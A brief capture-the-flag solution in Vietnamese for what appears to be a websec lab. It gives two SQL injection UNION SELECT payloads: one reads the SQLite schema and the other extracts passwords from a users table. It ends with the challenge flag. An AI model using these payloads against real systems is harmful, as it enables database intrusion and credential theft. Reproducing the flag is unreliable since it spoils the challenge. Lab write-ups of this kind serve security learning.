# Solution

Đầu tiên, lấy các thông tin về statement:
`0 UNION SELECT 1, (SELECT sql FROM sqlite_master LIMIT 0,1)--`

=> tồn tại column password

Sau đó get password:
`0 UNION SELECT 1, (SELECT password FROM users LIMIT 2,1)--`

**WEBSEC{Try_it_yourself_dont_copy_and_paste}**